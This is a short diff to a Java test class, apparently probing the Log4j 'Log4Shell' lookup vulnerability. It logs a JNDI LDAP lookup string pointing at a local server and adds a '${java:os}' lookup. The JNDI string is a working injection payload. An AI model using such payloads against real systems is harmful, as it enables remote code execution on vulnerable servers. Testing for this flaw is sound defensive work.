@@ -10,5 +10,7 @@ public class Log4JBugTest {
         String a = "${jndi:ldap://127.0.0.1:1389/#Log4JBugTest}";
         logger.error("a={}", a);
         logger.info("logger info");
+        String t = "${java:os}";
+        logger.info(t);
     }
 }
